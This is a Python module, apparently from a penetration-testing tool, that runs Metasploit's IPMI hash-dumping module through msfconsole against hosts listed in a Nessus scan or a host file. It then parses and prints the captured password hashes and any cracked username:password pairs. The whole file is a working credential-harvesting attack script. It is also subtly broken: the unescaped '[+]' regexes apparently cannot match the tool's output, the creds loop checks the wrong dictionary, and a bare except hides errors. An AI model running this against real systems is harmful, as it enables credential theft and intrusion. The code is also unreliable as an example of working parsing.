from src.utilities.utilities import find_scan, add_default_solver_parser_arguments, add_default_parser_arguments
from src.modules.nv_parse import GroupNessusScanOutput
import subprocess
import re

code = 20

def get_default_config():
    return """
["20"]
"""
r = r"[+] (.*) - IPMI - Hash found: (.*)"
r1 =  r"[+] (.*) - IPMI - Hash for user '(.*)' matches password '(.*)'"

def helper_parse(subparser):
    parser_task1 = subparser.add_parser(str(code), help="IPMI")
    add_default_solver_parser_arguments(parser_task1)
    add_default_parser_arguments(parser_task1, False)
    parser_task1.set_defaults(func=solve) 

def solve(args, is_all = False):
    print("Running metasploit ipmi dumphashes module, there will be no progression bar")
    hashes = {}
    creds = {}
    
    hosts = []
    if args.file:
        scan: GroupNessusScanOutput = find_scan(args.file, code)
        if not scan: 
            if is_all: return
            if not args.ignore_fail: print("No id found in json file")
            return
        hosts = scan.hosts
    elif args.list_file:
        with open(args.list_file, 'r') as f:
            hosts = [line.strip() for line in f]
    
    result = ", ".join(h.split(":")[0] for h in hosts)
    command = ["msfconsole", "-q", "-x", f"color false; use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS {result}; set ConnectTimeout {args.timeout}; set THREADS {args.threads}; run; exit"]
    try:
        result = subprocess.run(command, text=True, capture_output=True)
        
        matches = re.findall(r, result.stdout)
        for m in matches:
            if m[0] not in hashes:
                hashes[m[0]] = []
            hashes[m[0]].append(f"{m[1]}")
            
        matches = re.findall(r1, result.stdout)
        for m in matches:
            if m[0] not in hashes:
                creds[m[0]] = []
            creds[m[0]].append(f"{m[1]}:{m[2]}")
                
    except Exception:pass


    
    if len(hashes) > 0:
        print("IPMI hashes dumped:")
        for key, value in hashes.items():
            print(f"{key}:")
            for v in value:
                print(f"    {v}")

    if len(creds) > 0:
        print("IPMI Creds found:")
        for key, value in creds.items():
            print(f"{key}:")
            for v in value:
                print(f"    {v}")